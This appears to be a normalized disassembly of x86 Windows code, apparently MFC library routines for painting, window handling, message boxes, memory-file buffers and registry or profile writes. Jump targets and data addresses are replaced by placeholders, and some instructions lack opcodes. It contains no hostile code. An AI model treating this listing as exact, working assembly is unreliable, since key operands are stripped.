call [ GetWindowDC@IAT ]
push eax
mov ecx esi
call sub_420ac5
test eax eax
jne r-xdata
mov eax [ eax + 0x1c ]
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
call sub_4212a8
sub_4210e6
mov eax sub_42606c
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_420afc
push eax
push [ esi + 0x10 ]
call [ ReleaseDC@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_420b2d
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_421128
mov eax sub_426080
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_420a0e
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
lea ecx [ esi + 0x14 ]
mov eax [ eax + 0x1c ]
push ecx
push eax
mov [ esi + 0x10 ] eax
call [ BeginPaint@IAT ]
push eax
mov ecx esi
call sub_420ac5
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
call sub_4212a8
sub_42119a
mov eax sub_426094
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x14 ]
push eax
push [ esi + 0x10 ]
call [ EndPaint@IAT ]
mov ecx esi
call sub_420afc
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_420b2d
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4211e1
mov eax sub_4260aa
call sub_40cc20
push esi
call sub_422d8a
mov esi eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_421452
call sub_41b7f4
push 0x48
mov ebx eax
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_41f850
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x20 ] eax
call sub_41b7f4
pop ebx
sub_421268
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4211e1
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_41aae8
sub_4212c1
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffff0
push [ ebp + 0x8 ]
call [ GetWindowLongA@IAT ]
and eax 0xf
cmp eax [ ebp + 0xc ]
je r-xdata
leave
retn 0x8
lea eax [ ebp - 0xc ]
push 0xa
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
lea eax [ ebp - 0xc ]
push r--data
push eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
sub_42130b
push ebp
mov ebp esp
sub esp 0x20
lea eax [ ebp - 0x20 ]
push 0x20
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
leave
retn 0x8
sub_421336
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp + 0xc ]
push edi
push eax
push [ ebp + 0x8 ]
call [ ClientToScreen@IAT ]
mov edi [ GetWindow@IAT ]
push 0x5
push [ ebp + 0x8 ]
xor eax eax
push esi
call [ GetDlgCtrlID@IAT ]
cmp ax 0xffff
je r-xdata
push 0x2
push esi
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
call edi
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_4213ab
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
mov esi eax
mov eax 0x100
cmp esi eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetWindowTextA@IAT ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowTextA@IAT ]
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x100 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
sub_42141c
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn 0x4
push edi
call [ GlobalFlags@IAT ]
and eax 0xff
mov ecx eax
dec eax
test ecx ecx
je r-xdata
push edi
call [ GlobalFree@IAT ]
push esi
lea esi [ eax + 0x1 ]
push edi
call [ GlobalUnlock@IAT ]
dec esi
jne r-xdata
pop esi
sub_421452
push esi
call sub_422b32
mov esi eax
test esi esi
je r-xdata
call sub_41a429
xor eax eax
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_40daf5
pop ecx
mov ecx [ esp + 0x8 ]
lea edx [ ecx + 0x4 ]
cmp eax edx
ja r-xdata
sub eax ecx
sub eax 0x4
push eax
push [ esi + 0xc ]
call sub_40da7e
pop ecx
pop ecx
push [ esi + 0xc ]
call sub_40c218
and [ esi + 0xc ] 0x0
pop ecx
jmp r-xdata
push 0x1
pop eax
pop esi
retn
sub_4214a4
mov eax sub_4266d3
call sub_40cc20
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ ebx ]
push edi
lea ecx [ esi + 0x10 ]
mov [ ebp - 0x10 ] esi
push ecx
mov ecx ebx
call [ eax + 0x18 ]
mov ecx [ ebp + 0xc ]
or [ esi + 0xc ] 0xffffffff
push 0x1
mov [ esi + 0x14 ] ecx
pop eax
xor edi edi
not ecx
test al cl
mov [ ebp - 0x4 ] edi
mov [ esi + 0x20 ] ebx
mov [ esi + 0x38 ] edi
mov [ esi + 0x34 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] eax
je r-xdata
mov [ esi + 0x3c ] 0x40
mov [ esi + 0x3c ] 0x10
jmp r-xdata
mov [ esi + 0x1c ] ecx
mov [ esi + 0x1c ] eax
mov [ esi + 0x2c ] edi
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x2c ] ecx
mov ecx [ ebp + 0x10 ]
mov eax 0x80
mov [ esi + 0x40 ] 0x89
cmp ecx eax
mov [ esi + 0x8 ] edi
jge r-xdata
mov eax [ esi + 0x2c ]
mov ecx [ ebp + 0x10 ]
add ecx eax
test [ esi + 0x14 ] 0x1
mov [ esi + 0x28 ] ecx
je r-xdata
mov eax [ ebx ]
push edi
push edi
push edi
push 0x3
mov ecx ebx
call [ eax + 0x50 ]
cmp eax edi
mov [ esi + 0x8 ] eax
jne r-xdata
mov eax [ esi + 0x1c ]
cmp [ esi + 0x2c ] edi
mov [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ esi + 0x24 ] eax
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov eax ecx
mov [ ebp + 0x10 ] edi
push [ esi + 0x1c ]
call sub_41b806
pop ecx
mov [ esi + 0x2c ] eax
mov [ esi + 0x18 ] edi
jmp r-xdata
sub_421580
mov eax sub_4266eb
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x20 ] 0x0
je r-xdata
mov ecx esi
call sub_4215c6
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x10 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
test [ esi + 0x14 ] 0x2
jne r-xdata
call sub_421608
sub_4215c6
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x18 ] edi
mov [ esi + 0x20 ] edi
jne r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx edi
je r-xdata
push [ esi + 0x2c ]
call sub_41b82f
pop ecx
mov [ esi + 0x2c ] edi
mov [ esi + 0x24 ] edi
mov ecx [ esi + 0x34 ]
mov [ esi + 0x38 ] edi
cmp ecx edi
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov [ esi + 0x34 ] edi
pop edi
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_421616
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
mov eax [ esi + 0x24 ]
push edi
mov edi [ esi + 0x28 ]
sub edi eax
cmp ebx edi
jae r-xdata
xor eax eax
jmp r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_40ce30
add [ esi + 0x24 ] edi
add [ ebp + 0x8 ] edi
add esp 0xc
sub ebx edi
je r-xdata
mov edi ebx
pop esi
pop ebx
leave
retn 0x8
mov eax [ ebp + 0xc ]
pop edi
sub eax ebx
mov eax ebx
xor edx edx
div [ esi + 0x1c ]
mov edi ebx
sub edi edx
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] edi
sub ebx [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
ja r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
mov ecx [ esi + 0x20 ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
call [ eax + 0x34 ]
add [ ebp + 0x8 ] eax
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
test eax eax
jbe r-xdata
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x28 ]
lea edi [ esi + 0x2c ]
push eax
mov edx [ ecx ]
push edi
push [ esi + 0x1c ]
push 0x0
call [ edx + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x24 ] eax
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] ebx
cmp ebx eax
ja r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_40ce30
add [ esi + 0x24 ] edi
add esp 0xc
sub ebx edi
mov edi ebx
mov eax [ esi + 0x2c ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x2c ]
mov [ esi + 0x24 ] eax
lea ecx [ eax + edi ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
mov edi [ esi + 0x28 ]
sub edi eax
cmp ebx edi
jae r-xdata
cmp edi ebx
jb r-xdata
mov ecx [ esi + 0x20 ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
push [ ebp - 0x8 ]
call [ eax + 0x34 ]
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
add edi eax
test eax eax
jbe r-xdata
sub_421725
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
test ebx ebx
mov esi ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x24 ]
mov edi [ esi + 0x28 ]
sub edi eax
cmp ebx edi
jae r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_40ce30
add [ esi + 0x24 ] edi
add [ ebp + 0x8 ] edi
add esp 0xc
sub ebx edi
je r-xdata
mov edi ebx
mov ecx esi
call sub_4217b5
mov eax ebx
xor edx edx
div [ esi + 0x1c ]
mov ecx [ esi + 0x20 ]
mov edi ebx
mov eax [ ecx ]
sub edi edx
push edi
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
add [ ebp + 0x8 ] edi
sub ebx edi
cmp [ esi + 0x8 ] 0x0
je r-xdata
push ebx
push [ ebp + 0x8 ]
push [ esi + 0x24 ]
call sub_40ce30
add esp 0xc
add [ esi + 0x24 ] ebx
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x28 ]
lea edi [ esi + 0x2c ]
push eax
mov edx [ ecx ]
push edi
push [ esi + 0x1c ]
push 0x1
call [ edx + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x24 ] eax
sub_4217b5
push esi
mov esi ecx
push edi
test [ esi + 0x14 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov edx [ esi + 0x2c ]
push ebx
xor ebx ebx
cmp [ esi + 0x8 ] ebx
lea edi [ esi + 0x2c ]
jne r-xdata
mov edx [ esi + 0x28 ]
mov eax [ esi + 0x24 ]
cmp edx eax
je r-xdata
cmp eax edx
je r-xdata
cmp eax edx
je r-xdata
mov eax [ esi + 0x28 ]
mov [ esi + 0x24 ] eax
jmp r-xdata
mov ecx [ esi + 0x20 ]
sub eax edx
push 0x1
push eax
mov edi [ ecx ]
call [ edi + 0x28 ]
mov ecx [ esi + 0x20 ]
lea edx [ esi + 0x28 ]
push edx
push edi
push [ esi + 0x1c ]
mov eax [ ecx ]
push 0x1
call [ eax + 0x50 ]
mov ecx [ esi + 0x20 ]
push ebp
push ebx
sub eax edx
mov ebp [ ecx ]
push ebx
push eax
push 0x2
call [ ebp + 0x50 ]
pop ebp
mov eax [ edi ]
pop ebx
mov [ esi + 0x24 ] eax
mov ecx [ esi + 0x20 ]
sub eax edx
push eax
push edx
mov ebx [ ecx ]
call [ ebx + 0x38 ]
jmp r-xdata
pop edi
pop esi
retn
sub_421831
mov eax [ ecx + 0x9c ]
push esi
test eax eax
je r-xdata
call sub_403ba6
mov esi eax
mov ecx esi
mov eax [ esi ]
call [ eax + 0xb0 ]
test eax eax
mov ecx esi
jne r-xdata
cmp eax 0x3f107
je r-xdata
call sub_421c6e
call sub_421bcc
pop esi
retn
pop esi
retn
mov edx [ ecx ]
push 0x1
push eax
call [ edx + 0x98 ]
pop esi
retn
sub_421875
push esi
push edi
mov esi ecx
push 0x2
call sub_4238a9
mov edi [ esp + 0xc ]
add [ esi + 0xa0 ] edi
mov eax [ esi + 0xa0 ]
test eax eax
jle r-xdata
push [ esi + 0xa4 ]
and [ esi + 0xa0 ] 0x0
call [ SetCursor@IAT ]
push [ rw-data ]
call [ SetCursor@IAT ]
test edi edi
jle r-xdata
push 0x2
call sub_423919
pop edi
pop esi
retn 0x4
cmp [ esi + 0xa0 ] 0x1
jne r-xdata
mov [ esi + 0xa4 ] eax
jmp r-xdata
sub_42194b
mov eax [ esp + 0x4 ]
push esi
lea esi [ ecx + 0xa8 ]
push edi
lea edi [ eax - 0xe110 ]
mov edx [ ecx ]
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov eax [ eax + edi * 4 ]
push eax
call [ edx + 0x7c ]
test eax eax
jne r-xdata
push 0x1
pop eax
pop edi
pop esi
retn 0x4
mov ecx [ esi ]
push edi
mov eax [ ecx ]
call [ eax ]
sub_42197e
push esi
call sub_403ba6
mov esi eax
test esi esi
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push [ esp + 0x8 ]
call [ eax + 0x64 ]
sub_4219ac
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
push edi
xor ebx ebx
mov edi ecx
push ebx
mov [ ebp - 0x10 ] edi
call sub_42197e
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_421b24
xor esi esi
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
cmp edi ebx
je r-xdata
push ebx
push ebx
push 0x376
push [ ebp - 0x4 ]
call [ SendMessageA@IAT ]
cmp eax ebx
je r-xdata
cmp esi ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
lea esi [ edi + 0x9c ]
mov esi eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
test bl 0xf0
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
test edi edi
je r-xdata
mov eax ebx
and eax 0xf
cmp eax 0x1
jbe r-xdata
add eax 0x30000
mov [ esi ] eax
lea eax [ ebp - 0x114 ]
push 0x104
push eax
push 0x0
lea edi [ ebp - 0x114 ]
call [ GetModuleFileNameA@IAT ]
mov edi [ edi + 0x78 ]
jmp r-xdata
or ebx 0x30
cmp eax 0x2
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
push ebx
push edi
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ MessageBoxA@IAT ]
test esi esi
mov edi eax
je r-xdata
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x10 ]
push 0x1
call sub_42197e
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0xc
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
sub_421a93
push ebp
mov ebp esp
call sub_422d64
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
xor ecx ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4219ac
push [ ebp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x8c ]
jmp r-xdata
pop ebp
retn 0xc
sub_421acb
mov eax sub_425ccc
call sub_40cc20
push ecx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_41f410
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
push esi
push eax
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
call sub_421a93
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_41c358
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov eax [ ebp + 0x8 ]
sub_421b24
push ebx
mov ebx [ GetParent@IAT ]
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
test ebp ebp
mov esi ebp
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
call sub_421bc0
test eax eax
jne r-xdata
test esi esi
mov edi esi
mov eax esi
je r-xdata
push esi
call ebx
mov esi eax
jmp r-xdata
mov esi [ eax + 0x1c ]
call sub_403ba6
test eax eax
jne r-xdata
test ebp ebp
jne r-xdata
push eax
mov edi eax
call ebx
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor esi esi
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
test edi edi
je r-xdata
push esi
call [ GetLastActivePopup@IAT ]
mov esi eax
and [ ebx ] 0x0
push edi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push 0x0
push edi
mov [ ebx ] edi
call [ EnableWindow@IAT ]
jmp r-xdata
sub_421bcc
push ecx
push ebx
push ebp
push esi
push edi
mov [ esp + 0x10 ] ecx
call [ GetCapture@IAT ]
mov esi [ SendMessageA@IAT ]
mov edi eax
xor ebp ebp
mov ebx 0x365
cmp edi ebp
je r-xdata
call [ GetFocus@IAT ]
push ebp
push ebp
push ebx
push edi
call esi
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
call sub_41e07f
cmp eax ebp
jne r-xdata
push ebp
push ebp
push ebx
push edi
call esi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
call sub_41e03a
mov edi eax
cmp edi ebp
jne r-xdata
mov eax [ eax + 0x1c ]
xor eax eax
jmp r-xdata
push edi
call sub_41e03a
jmp r-xdata
mov eax [ esp + 0x14 ]
push 0xe147
push 0x111
push [ eax + 0x1c ]
call esi
push ebp
push ebx
push edi
call esi
test eax eax
jne r-xdata
push eax
call [ GetLastActivePopup@IAT ]
mov edi eax
cmp edi ebp
je r-xdata
push edi
call sub_41e03a
jmp r-xdata
mov edi eax
push ebp
cmp edi ebp
je r-xdata
sub_421c6e
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
mov ecx esi
call sub_421bcc
cmp eax 0x3f107
je r-xdata
pop esi
retn
call sub_422d64
mov eax [ eax + 0x4 ]
push 0x1
push [ esi + 0x4c ]
mov ecx eax
mov edx [ eax ]
call [ edx + 0x98 ]
pop esi
retn
sub_421ca1
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
cmp [ esi + 0x7c ] 0x0
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x10 ]
push [ esi + 0x90 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ WritePrivateProfileStringA@IAT ]
push [ ebp + 0x8 ]
call sub_423760
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn 0xc
push edi
lea eax [ ebp + 0x10 ]
push 0x4
push eax
push 0x4
push 0x0
push [ ebp + 0xc ]
push esi
call [ RegSetValueExA@IAT ]
push esi
mov edi eax
call [ RegCloseKey@IAT ]
xor eax eax
test edi edi
sete al
pop edi
jmp r-xdata
sub_421d32
push esi
mov esi ecx
call sub_41fda4
mov eax [ esp + 0x10 ]
and [ esi + 0x14 ] 0x0
mov ecx [ esp + 0xc ]
mov [ esi + 0x10 ] eax
neg eax
sbb eax eax
and [ esi + 0x24 ] 0x0
not eax
and eax ecx
mov [ esi ] r--data
mov [ esi + 0x1c ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x18 ] ecx
mov eax esi
pop esi
retn 0xc
sub_421d6e
mov eax sub_42656c
call sub_40cc20
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
cmp [ esi + 0x20 ] edi
mov [ ebp - 0x4 ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call sub_41fdf9
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
call sub_421f55
sub_421dd9
mov ecx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov eax ecx
mov edx edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn 0xc
sub_421e0f
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x18 ]
cmp ebx edi
jbe r-xdata
pop edi
pop esi
pop ebx
retn 0x4
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp edi ebx
jae r-xdata
call sub_41a429
mov eax [ esi + 0x20 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x10 ]
mov edx [ esi ]
push edi
push eax
mov ecx esi
call [ edx + 0x58 ]
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x54 ]
jmp r-xdata
add edi eax
cmp edi ebx
jb r-xdata
mov [ esi + 0x20 ] ebx
mov [ esi + 0x18 ] edi
call sub_41a429
mov ebx eax
test ebx ebx
jne r-xdata
sub_421e68
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x18 ]
jbe r-xdata
cmp edi [ esi + 0x14 ]
jae r-xdata
mov eax [ esi ]
push edi
call [ eax + 0x64 ]
mov [ esi + 0x1c ] edi
pop edi
pop esi
retn 0x4
mov [ esi + 0x14 ] edi
sub_421e8b
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi + 0x1c ]
cmp ecx eax
jbe r-xdata
pop edi
pop esi
retn 0x8
lea edx [ ecx + edi ]
cmp edx eax
jbe r-xdata
mov edx [ esi + 0x20 ]
mov eax [ esi ]
add edx ecx
push edi
push edx
mov ecx esi
push [ esp + 0x14 ]
call [ eax + 0x5c ]
add [ esi + 0x14 ] edi
mov eax edi
sub eax ecx
mov edi eax
sub_421ecc
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov eax [ esi + 0x14 ]
add eax edi
cmp eax [ esi + 0x18 ]
jbe r-xdata
mov ecx [ esi + 0x20 ]
mov eax [ esi ]
add ecx [ esi + 0x14 ]
push edi
push [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
add [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0x1c ]
jbe r-xdata
mov edx [ esi ]
push eax
call [ edx + 0x64 ]
mov [ esi + 0x1c ] eax
sub_421f0e
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push esi
push edi
mov edi ecx
mov esi [ edi + 0x14 ]
jne r-xdata
cmp [ ebp + 0xc ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
add esi [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x2
jne r-xdata
test esi esi
jge r-xdata
mov [ edi + 0x14 ] esi
mov eax esi
jmp r-xdata
push 0x0
push 0xffffffff
push 0x9
call sub_42069c
or eax 0xffffffff
mov esi [ edi + 0x1c ]
pop edi
pop esi
pop ebp
retn 0x8
sub_421f55
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x20 ]
mov [ esi + 0x10 ] edi
cmp eax edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
je r-xdata
mov [ esi + 0x20 ] edi
pop edi
pop esi
retn
cmp [ esi + 0x24 ] edi
je r-xdata
mov edx [ esi ]
push eax
call [ edx + 0x60 ]
sub_421f94
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
cmp ebx 0x3
mov esi ecx
jne r-xdata
cmp ebx 0x2
jne r-xdata
push 0x1
pop eax
jmp r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp ebx 0x1
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi + 0x14 ] eax
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0x1c ]
jbe r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ esi + 0x14 ]
mov edx [ ebp + 0x10 ]
add eax [ esi + 0x20 ]
cmp ebx 0x1
mov [ edx ] eax
jne r-xdata
mov eax [ esi + 0x14 ]
add eax edi
cmp eax [ esi + 0x18 ]
jbe r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0x1c ] eax
cmp edi 0xffffffff
jne r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x18 ]
add eax edi
cmp ecx eax
jae r-xdata
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x64 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x1c ]
add eax edi
cmp ecx eax
jae r-xdata
mov edi [ esi + 0x18 ]
sub edi [ esi + 0x14 ]
add eax [ esi + 0x20 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
mov eax ecx
mov ecx [ esi + 0x20 ]
add eax ecx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
sub eax [ edx ]
add [ esi + 0x14 ] eax
mov eax ecx
mov eax [ ecx ]
pop edi
sub eax [ edx ]
sub_42203b
push ebp
mov ebp esp
sub esp 0x100
lea eax [ ebp - 0x100 ]
push 0x100
push eax
push [ ebp + 0xc ]
call sub_41f494
test eax eax
je r-xdata
leave
retn 0x10
push [ ebp + 0x14 ]
lea eax [ ebp - 0x100 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_422075
sub_422075
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi esi
cmp [ esi ] bl
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx ebx
call sub_41c5cf
mov edi eax
mov cl [ edi ]
cmp cl 0x25
jne r-xdata
sub edi [ ebx ]
mov ecx ebx
push edi
call sub_41c61e
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov cl [ esi ]
cmp cl 0x25
jne r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x30
jl r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x30
jl r-xdata
inc edi
inc ebx
inc edi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
jmp r-xdata
